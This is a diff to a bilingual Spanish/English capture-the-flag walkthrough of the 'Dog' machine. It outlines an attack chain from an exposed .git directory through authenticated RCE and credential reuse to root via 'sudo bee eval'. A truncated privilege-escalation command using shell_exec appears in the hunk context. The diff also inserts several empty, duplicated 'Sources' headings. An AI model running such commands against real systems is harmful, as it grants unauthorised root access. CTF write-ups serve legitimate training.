@@ -15,12 +15,19 @@
 
 ---
 
+## Fuentes / Sources
+
+- [IppSec: Dog (video)](https://youtube.com/watch?v=Z24FN8qqngY) - IppSec - fecha de acceso: 2026-09-24.
+
 ## 🎯 Objetivo / Goal
 
 > **ES:** Conseguir `user.txt` y `root.txt` vía `.git` expuesto → RCE autenticado con módulo (tar) → reuse a `johncusack` → `bee eval` con `sudo`.
 > **EN:** Get `user.txt` and `root.txt` via exposed `.git` → authenticated RCE with module (tar) → reuse to `johncusack` → `bee eval` with `sudo`.
 
 ---
+
+## Fuentes / Sources
+
 
 ## 🛠️ Herramientas usadas / Tools used
 
@@ -32,6 +39,9 @@
 - [ ] ssh / su
 
 ---
+
+## Fuentes / Sources
+
 
 ## 📋 Pasos / Steps
 
@@ -119,6 +129,9 @@ sudo /usr/local/bin/bee --root /var/www/html eval "echo shell_exec('/bin/bash -c
 
 ---
 
+## Fuentes / Sources
+
+
 ## 🧠 Lo aprendido / Learned
 
 > **ES:** Un `.git` público equivale a código fuente + secretos; tras RCE, probar cada secreto en `su`/SSH; los `sudo` a CLIs con `eval` son root directo.
@@ -131,6 +144,9 @@ sudo /usr/local/bin/bee --root /var/www/html eval "echo shell_exec('/bin/bash -c
 
 ---
 
+## Fuentes / Sources
+
+
 ## 📚 Fuentes y Referencias / Sources
 
 - **Fuente:** Nota local `index.md` (notas propias en chino/inglés, con capturas en `img/`) — randark/nota migrada
@@ -140,6 +156,9 @@ sudo /usr/local/bin/bee --root /var/www/html eval "echo shell_exec('/bin/bash -c
 - **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)
 
 ---
+
+## Fuentes / Sources
+
 
 ## ⚠️ Aviso Legal / Disclaimer
 
